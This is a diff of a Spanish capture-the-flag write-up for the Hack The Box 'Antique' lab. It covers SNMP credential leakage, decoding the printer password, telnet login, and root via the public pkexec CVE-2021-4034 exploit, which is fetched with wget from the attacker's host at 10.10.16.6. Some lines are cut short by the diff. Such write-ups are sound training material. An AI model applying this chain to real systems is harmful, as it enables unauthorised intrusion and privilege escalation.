@@ -1,8 +1,8 @@
 ---
 layout: single
 title: Antique - Hack The Box
-excerpt: "Antique is an easy Linux machine featuring a network printer disclosing credentials through SNMP string which allows logging into telnet service. Foothold can be obtained by exploiting a feature in printer. CUPS administration service running locally. This service can be exploited further to gain root access on the server. " 
-date: 2024-04-03
+excerpt: "Antique is an easy Linux machine featuring a network printer disclosing credentials through SNMP string which allows logging into telnet service. Foothold can be obtained by exploiting a feature in printer. CUPS administration service running locally. This service can be exploited further to >
+date: 2024-04-02
 classes: wide
 header:
   teaser: /assets/images/htb-antique/antique.png
@@ -13,21 +13,20 @@ categories:
 tags:  
   - Pkexec
   - UDP
-  - Telnet
   - SNMP
 ---
 
 ![](/assets/images/htb-antique/antique.png)
 
-Antique is an easy Linux machine featuring a network printer disclosing credentials through SNMP string which allows logging into telnet service. Foothold can be obtained by exploiting a feature in printer. CUPS administration service running locally. This service can be exploited further to gain root access on the server. 
+Antique is an easy Linux machine featuring a network printer disclosing credentials through SNMP string which allows logging into telnet service. Foothold can be obtained by exploiting a feature in printer. CUPS administration service running locally. This service can be exploited further to gain root >
 
 ## Portscan
 
 ```
  Nmap 7.94SVN scan initiated Tue Apr  2 17:03:02 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -oG allports 10.10.11.107
  Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
-Host: 10.10.11.107 ()	Status: Up
-Host: 10.10.11.107 ()	Ports: 23/open/tcp//telnet///	Ignored State: closed (65534)
+Host: 10.10.11.107 ()   Status: Up
+Host: 10.10.11.107 ()   Ports: 23/open/tcp//telnet///   Ignored State: closed (65534)
  Nmap done at Tue Apr  2 17:03:14 2024 -- 1 IP address (1 host up) scanned in 12.38 seconds
 ```
 Y con esto analizamos los puertos abiertos:
@@ -40,7 +39,7 @@ Host is up (0.041s latency).
 PORT   STATE SERVICE VERSION
 23/tcp open  telnet?
 | fingerprint-strings: 
-|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServer>
 |     JetDirect
 |     Password:
 |   NULL: 
@@ -71,7 +70,6 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 10.15 seconds
            Raw packets sent: 369 (22.540KB) | Rcvd: 17 (1.327KB)
 ```
-
 ## Intrusión SNMP
 
 
@@ -83,11 +81,11 @@ iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 2
 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
 iso.3.6.1.4.1.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
 ```
-Vemos que esta en hexadecimal y vamos a pasarlo de un modo que sea legible: 
+Vemos que esta en hexadecimal y vamos a pasarlo de un modo que sea legible:
 ```
 echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xargs | xxd -ps -r
-P@ssw0rd@123!!123�q��"2Rbs3CSs��$4�Eu�WGW�(8i	IY�aA�"1&1A5
+P@ssw0rd@123!!123�q��"2Rbs3CSs��$4�Eu�WGW�(8i   IY�aA�"1&1A5
 ```
 ## Entramos con telnet en el puerto 443
 
@@ -122,7 +120,7 @@ lp@antique:~$ which pkexec
 /usr/bin/pkexec
 ```
 
-Desde nuestra terminal, vamos a clonarnos este repositorio https://github.com/berdav/CVE-2021-4034 que nos va a escalar el privilegio mediante pkexec, la comprimimos en .tar.gz (Ya que zip no esta en la maquina víctima).Desde el equipo de la víctima, obtenemos el comprimido de nuestro equipo(wget http://10.10.16.6/comprimido.tar.gz). Lo descomprimimos, hacemos make, y lo ejecutamos:
+Desde nuestra terminal, vamos a clonarnos este repositorio https://github.com/berdav/CVE-2021-4034 que nos va a escalar el privilegio mediante pkexec, la comprimimos en .tar.gz (Ya que zip no esta en la maquina víctima).Desde el equipo de la víctima, obtenemos el comprimido de nuestro equipo(wget http:>
 ```
 lp@antique:/tmp/CVE-2021-4034$ ./cve-2021-4034
 # whoami
